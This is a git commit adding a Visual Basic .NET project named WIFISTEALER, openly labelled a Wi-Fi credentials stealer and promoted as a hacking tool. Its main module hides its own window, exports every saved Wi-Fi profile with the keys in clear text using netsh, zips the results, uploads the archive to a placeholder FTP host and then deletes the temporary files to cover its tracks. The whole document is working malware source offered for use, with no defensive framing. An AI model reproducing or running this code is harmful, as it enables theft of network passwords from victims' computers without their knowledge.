0cfe392d32dd99ad3b77f53ee2fba309e40bd196
ctoslab <63665435+ctoslab@users.noreply.github.com>
2020-11-24 03:07:17 -0500

    Add files via upload

---
+++ WIFISTEALER/Module1.vb
@@ -0,0 +1,37 @@
+﻿Imports System.Diagnostics
+Imports System.IO
+Imports System.Net
+Imports System.Net.Mail
+
+'// This project was created by CTOSLAB
+'// Join our telegram group to get more hacking tools
+'// https://t.me/ctoslab
+
+Module Module1
+    Sub Main()
+        ' Creating folder
+        Dim tmp As String = Path.GetTempPath()
+        Dim root As String = tmp + "\wsteal\"
+
+        ' If the folder does not exist, so create one
+        If Not Directory.Exists(root) Then
+            Directory.CreateDirectory(root)
+        End If
+
+        ' Run command to export all saved wifi
+        Threading.Thread.Sleep(3000)
+        Dim wsteal As String = "netsh wlan export profile folder=%tmp%\wsteal\ key=clear && cd %tmp%\wsteal\ && powershell Compress-Archive *.xml pwn3d.zip"
+        Shell("cmd.exe /c" + wsteal, AppWinStyle.Hide)
+
+        ' Upload file to ftp
+        Threading.Thread.Sleep(10000)
+        Dim client As WebClient = New WebClient
+        client.Credentials = New NetworkCredential("YOURFTPUSERNAME", "YOURFTPPASSWORD")
+        client.UploadFile("ftp://YOURFTPHOST/public_html/pwn3d.zip", tmp + "\wsteal\pwn3d.zip")
+
+        ' Delete All
+        Dim workpath As String = tmp + "\wsteal\"
+        System.IO.Directory.Delete(workpath, True)
+
+    End Sub
+End Module
---
+++ WIFISTEALER/My Project/AssemblyInfo.vb
@@ -0,0 +1,34 @@
+﻿Imports System
+Imports System.Reflection
+Imports System.Runtime.InteropServices
+
+' General Information about an assembly is controlled through the following 
+' set of attributes. Change these attribute values to modify the information
+' associated with an assembly.
+
+' Review the values of the assembly attributes
+
+<Assembly: AssemblyTitle("WIFISTEALER")>
+<Assembly: AssemblyDescription("Wi-Fi Credentials Stealer - CTOSLAB TOOL")>
+<Assembly: AssemblyCompany("ctoslab")>
+<Assembly: AssemblyProduct("CTOSLAB TOOLS")>
+<Assembly: AssemblyCopyright("Copyright © ctoslab 2020")>
+<Assembly: AssemblyTrademark("")>
+
+<Assembly: ComVisible(False)>
+
+'The following GUID is for the ID of the typelib if this project is exposed to COM
+<Assembly: Guid("9b5dc5ef-901a-4cf1-8399-331b4cb7c9c4")>
+
+' Version information for an assembly consists of the following four values:
+'
+'      Major Version
+'      Minor Version 
+'      Build Number
+'      Revision
+'
+' You can specify all the values or you can default the Build and Revision Numbers 
+' by using the '*' as shown below:
+
+<Assembly: AssemblyVersion("1.0.5.4")>
+<Assembly: AssemblyFileVersion("1.0.5.4")>
